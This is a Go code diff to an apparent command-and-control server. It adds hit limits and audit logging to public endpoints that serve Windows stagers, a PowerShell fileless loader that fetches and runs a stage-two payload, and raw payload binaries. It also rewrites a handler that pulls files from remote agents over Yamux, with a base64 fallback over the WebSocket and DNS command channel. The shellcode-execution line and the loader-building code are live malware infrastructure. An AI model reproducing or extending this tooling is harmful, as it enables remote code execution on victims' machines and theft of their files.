@@ -4,21 +4,23 @@ import (
 	"cupcake-server/pkg/globals"
 	"cupcake-server/pkg/hub"
 	"cupcake-server/pkg/paths"
+	"cupcake-server/pkg/stagerguard"
 	"cupcake-server/pkg/utils"
 	"cupcake-server/services"
-	"encoding/base64"
+	"errors"
 	"fmt"
 	"io"
+	"log"
 	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
+	"time"
 
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
-	"sync"
-	"time"
 )
 
 const stagerCacheTTL = 10 * time.Minute
@@ -30,6 +32,9 @@ type stagerCacheEntry struct {
 
 var StagerCache = sync.Map{}
 
+// stagerHits limits downloads per cache id (default 5; CUPCAKE_STAGER_MAX_HITS).
+var stagerHits = stagerguard.NewHitCounter(stagerguard.MaxHitsFromEnv())
+
 func init() {
 	go func() {
 		t := time.NewTicker(2 * time.Minute)
@@ -39,6 +44,9 @@ func init() {
 			StagerCache.Range(func(k, v interface{}) bool {
 				if e, ok := v.(stagerCacheEntry); ok && now.After(e.expiresAt) {
 					StagerCache.Delete(k)
+					if id, ok := k.(string); ok {
+						stagerHits.Delete(id)
+					}
 				}
 				return true
 			})
@@ -62,6 +70,7 @@ type StagerConfig struct {
 }
 
 func stagerCacheStore(id string, cfg StagerConfig) {
+	stagerHits.Reset(id)
 	StagerCache.Store(id, stagerCacheEntry{cfg: cfg, expiresAt: time.Now().Add(stagerCacheTTL)})
 }
 
@@ -76,9 +85,38 @@ func stagerCacheLoad(id string) (StagerConfig, bool) {
 	}
 	if time.Now().After(e.expiresAt) {
 		StagerCache.Delete(id)
+		stagerHits.Delete(id)
 		return StagerConfig{}, false
 	}
 	return e.cfg, true
+}
+
+// stagerCacheConsume loads a cache entry and records one download hit.
+// status is one of: ok, not_found, expired, max_hits (for audit).
+func stagerCacheConsume(id string) (cfg StagerConfig, status string, ok bool) {
+	v, found := StagerCache.Load(id)
+	if !found {
+		return StagerConfig{}, stagerguard.StatusNotFound, false
+	}
+	e, castOK := v.(stagerCacheEntry)
+	if !castOK {
+		return StagerConfig{}, stagerguard.StatusNotFound, false
+	}
+	if time.Now().After(e.expiresAt) {
+		StagerCache.Delete(id)
+		stagerHits.Delete(id)
+		return StagerConfig{}, stagerguard.StatusExpired, false
+	}
+	if !stagerHits.Try(id) {
+		StagerCache.Delete(id)
+		stagerHits.Delete(id)
+		return StagerConfig{}, stagerguard.StatusMaxHits, false
+	}
+	return e.cfg, stagerguard.StatusOK, true
+}
+
+func stagerAudit(c *gin.Context, id, status string) {
+	stagerguard.Audit(c.ClientIP(), c.Request.URL.Path, id, status)
 }
 
 // Build log WS is browser-only — use AdminCheckOrigin (empty Origin rejected).
@@ -456,31 +494,68 @@ func HandleFsDownload(c *gin.Context) {
 		return
 	}
 
+	body, size, err := services.OpenDownloadViaYamux(uuid, path)
+	if err != nil {
+		if errors.Is(err, services.ErrYamuxRequired) {
+			// ⚡ FALLBACK: WebSocket / DNS agents have no Yamux session — stream the
+			// file over the control-plane command channel (base64 chunks).
+			log.Printf("[download] yamux unavailable for agent=%s, using control-plane chunk fallback path=%s", uuid, path)
+			downloadViaControlPlane(c, uuid, path)
+			return
+		}
+		if errors.Is(err, services.ErrAgentOffline) || strings.Contains(strings.ToLower(err.Error()), "offline") {
+			c.JSON(http.StatusNotFound, gin.H{"error": "agent offline", "code": "offline"})
+			return
+		}
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+	defer body.Close()
+
 	filename := filepath.Base(path)
 	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
 	c.Header("Content-Type", "application/octet-stream")
-	c.Header("Transfer-Encoding", "chunked")
+	c.Header("Content-Length", fmt.Sprintf("%d", size))
+	c.Status(http.StatusOK)
 
-	offset := uint64(0)
-	chunkSize := 2 * 1024 * 1024 // 2MB
+	if _, err := io.Copy(c.Writer, body); err != nil {
+		// Headers already sent; cannot switch to JSON.
+		return
+	}
+}
 
-	c.Stream(func(w io.Writer) bool {
-		dataBase64, isEOF, err := services.DownloadChunk(uuid, path, offset, chunkSize)
+// downloadViaControlPlane streams a remote file to the panel as base64 chunks
+// over the command channel (WS/DNS fallback; no Yamux session needed).
+func downloadViaControlPlane(c *gin.Context, uuid, path string) {
+	filename := filepath.Base(path)
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
+	c.Header("Content-Type", "application/octet-stream")
+	c.Status(http.StatusOK)
+
+	const chunkSize = 2 * 1024 * 1024 // 2 MiB raw → ~2.7 MiB base64 per round-trip
+	var offset uint64
+	contentLengthSet := false
+
+	for {
+		raw, isEOF, total, err := services.DownloadChunk(uuid, path, offset, chunkSize)
 		if err != nil {
-			return false // Abort stream
+			log.Printf("[download] FAIL agent=%s path=%s offset=%d: %v", uuid, path, offset, err)
+			return
 		}
-
-		data, err := base64.StdEncoding.DecodeString(dataBase64)
-		if err == nil && len(data) > 0 {
-			w.Write(data)
-			offset += uint64(len(data))
+		if !contentLengthSet && total > 0 {
+			c.Header("Content-Length", fmt.Sprintf("%d", total))
+			contentLengthSet = true
 		}
-
-		if isEOF || len(data) == 0 {
-			return false // End of file
+		if len(raw) > 0 {
+			if _, werr := c.Writer.Write(raw); werr != nil {
+				return
+			}
+			offset += uint64(len(raw))
 		}
-		return true // Request next chunk
-	})
+		if isEOF || len(raw) == 0 {
+			return
+		}
+	}
 }
 
 func HandleGetStager(c *gin.Context) {
@@ -759,11 +834,13 @@ func buildFilelessStagerCommand(stage2URL string) string {
 
 func HandleServePayload(c *gin.Context) {
 	id := c.Param("id")
-	conf, ok := stagerCacheLoad(id)
+	conf, status, ok := stagerCacheConsume(id)
 	if !ok {
+		stagerAudit(c, id, status)
 		c.Data(404, "text/plain", []byte("Not found"))
 		return
 	}
+	stagerAudit(c, id, stagerguard.StatusOK)
 
 	// 🚀 Windows BAT stager: returns a script that auto-detects x64/x86
 	if conf.OS == "windows_bat" {
@@ -841,11 +918,13 @@ exit /b 0
 // Windows BAT stager at /api/s/bin/:id.
 func HandleServeRawPayload(c *gin.Context) {
 	id := c.Param("id")
-	conf, ok := stagerCacheLoad(id)
+	conf, status, ok := stagerCacheConsume(id)
 	if !ok {
+		stagerAudit(c, id, status)
 		c.Data(404, "text/plain", []byte("stager id expired or unknown — regenerate one-click command in the panel"))
 		return
 	}
+	stagerAudit(c, id, stagerguard.StatusOK)
 
 	// Auto-detect target OS from User-Agent if set to "auto"
 	targetOS := conf.OS
@@ -1054,14 +1133,20 @@ func buildAndCacheFilelessStage2(
 func HandleServeStage2(c *gin.Context) {
 	id := c.Param("id")
 	if id == "" || strings.Contains(id, "..") || strings.Contains(id, "/") {
+		stagerAudit(c, id, stagerguard.StatusBadID)
 		c.Data(400, "text/plain", []byte("bad id"))
 		return
 	}
-	body, _, err := services.LoadStage2(id)
+	body, _, status, err := services.ConsumeStage2(id)
 	if err != nil {
+		if status == "" {
+			status = stagerguard.StatusNotFound
+		}
+		stagerAudit(c, id, status)
 		c.Data(404, "text/plain", []byte(err.Error()))
 		return
 	}
+	stagerAudit(c, id, stagerguard.StatusOK)
 	c.Header("Content-Disposition", "attachment; filename=stage2.bin")
 	c.Header("Cache-Control", "no-store")
 	c.Data(200, "application/octet-stream", body)
@@ -1083,19 +1168,27 @@ $c::WaitForSingleObject($c::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)
 // HandleServeFilelessLoader serves a PS loader script for the short one-click command.
 // Route is public (under /api/s/l/:id, already auth-exempt). Returns 404 when the
 // stager id is unknown/expired so the operator must regenerate the command.
+// Consumes one hit on the loader id (not stage2); stage2 hits apply on /api/stage2/:id.
 func HandleServeFilelessLoader(c *gin.Context) {
 	id := c.Param("id")
 	if id == "" || strings.Contains(id, "..") || strings.Contains(id, "/") {
+		stagerAudit(c, id, stagerguard.StatusBadID)
 		c.Data(400, "text/plain", []byte("bad id"))
 		return
 	}
-	conf, ok := stagerCacheLoad(id)
+	conf, status, ok := stagerCacheConsume(id)
 	if !ok || conf.Delivery != "fileless" || conf.Stage2ID == "" {
+		if ok {
+			// Wrong delivery type still costs a hit; treat as not found for clients.
+			status = stagerguard.StatusNotFound
+		}
+		stagerAudit(c, id, status)
 		c.Data(404, "text/plain", []byte("stager id expired or unknown — regenerate one-click command in the panel"))
 		return
 	}
-	// Verify stage2 still cached (TTL enforced by services.LoadStage2).
-	if _, _, err := services.LoadStage2(conf.Stage2ID); err != nil {
+	// Peek only — do not burn stage2 download quota for the loader script.
+	if !services.Stage2Exists(conf.Stage2ID) {
+		stagerAudit(c, id, stagerguard.StatusExpired)
 		c.Data(404, "text/plain", []byte("stage2 expired — regenerate one-click command in the panel"))
 		return
 	}
@@ -1105,6 +1198,7 @@ func HandleServeFilelessLoader(c *gin.Context) {
 		proto = "https"
 	}
 	stage2URL := fmt.Sprintf("%s://%s/api/stage2/%s", proto, c.Request.Host, conf.Stage2ID)
+	stagerAudit(c, id, stagerguard.StatusOK)
 	c.Header("Content-Type", "text/plain; charset=utf-8")
 	c.Header("Cache-Control", "no-store")
 	c.Data(200, "text/plain; charset=utf-8", []byte(filelessLoaderScript(stage2URL)))
